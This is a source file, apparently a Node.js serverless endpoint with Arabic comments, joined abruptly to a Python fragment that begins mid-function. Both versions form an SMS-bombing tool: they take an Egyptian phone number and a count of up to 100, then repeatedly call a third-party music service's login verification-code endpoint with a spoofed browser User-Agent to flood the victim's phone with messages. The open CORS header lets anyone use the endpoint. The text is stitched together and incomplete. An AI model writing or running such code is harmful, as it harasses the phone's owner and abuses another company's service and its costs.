// ملف: api/send.js

import fetch from 'node-fetch';

export default async function handler(req, res) {
    // السماح بطلبات من أي مصدر (CORS)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // التعامل مع طلبات OPTIONS
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // التحقق من أن الطلب من نوع POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'طريقة الطلب غير مسموحة' });
    }

    try {
        // قراءة البيانات من الطلب
        const body = await req.body.json();
        const { number, sms_count = 1 } = body;

        // التحقق من صحة رقم الهاتف
        if (!number || !number.startsWith("01") || number.length !== 11) {
            return res.status(400).json({ message: 'بيانات غير صحيحة، تأكد من رقم الهاتف' });
        }

        // تنفيذ عملية إرسال الرسائل
        const { success, failure } = await sendSmsRequests(number, sms_count);

        // إرسال الرد النهائي
        const responseMessage = `تمت العملية: ${success} رسالة ناجحة و ${failure} فاشلة.`;
        return res.status(200).json({ message: responseMessage });

    } catch (error) {
        console.error('Server Error:', error);
        return res.status(500).json({ message: 'حدث خطأ داخلي في الخادم' });
    }
}

async function sendSmsRequests(number, sms_count) {
    const url = "https://api.twistmena.com/music/Dlogin/sendCode";
    const phone_number = "2" + number;
    let success = 0;
    let failure = 0;
    const count = Math.min(parseInt(sms_count), 100);

    for (let i = 0; i < count; i++) {
        const payload = JSON.stringify({ dial: phone_number });
        const headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json",
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: payload,
                timeout: 10000
            });

            if (response.ok) {
                success++;
            } else {
                failure++;
            }
        } catch (error) {
            failure++;
        }

        // تأخير لمدة ثانية بين كل طلب
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    return { success, failure };
}    except Exception as e:
        return {
            'statusCode': 400,
            'headers': headers,
            'body': json.dumps({'message': f'خطأ في قراءة البيانات: {str(e)}'}, ensure_ascii=False)
        }

    # التحقق من صحة رقم الهاتف
    if not (number and number.startswith("01") and len(number) == 11):
        return {
            'statusCode': 400,
            'headers': headers,
            'body': json.dumps({'message': 'بيانات غير صحيحة، تأكد من رقم الهاتف'}, ensure_ascii=False)
        }

    # تنفيذ إرسال الرسائل
    success_count, failure_count = send_sms_requests(number, sms_count)

    # إرسال الرد
    response_message = f"تمت العملية: {success_count} رسالة ناجحة و {failure_count} فاشلة."
    return {
        'statusCode': 200,
        'headers': headers,
        'body': json.dumps({'message': response_message}, ensure_ascii=False)
    }

def send_sms_requests(number, sms_count):
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    phone_number = "2" + number
    success = 0
    failure = 0
    count = min(int(sms_count), 100)
    for _ in range(count):
        payload = json.dumps({"dial": phone_number})
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json",
        }
        try:
            response = requests.post(url, headers=headers, data=payload, timeout=10)
            if response.status_code == 200:
                success += 1
            else:
                failure += 1
        except Exception:
            failure += 1
        time.sleep(1)
    return success, failure
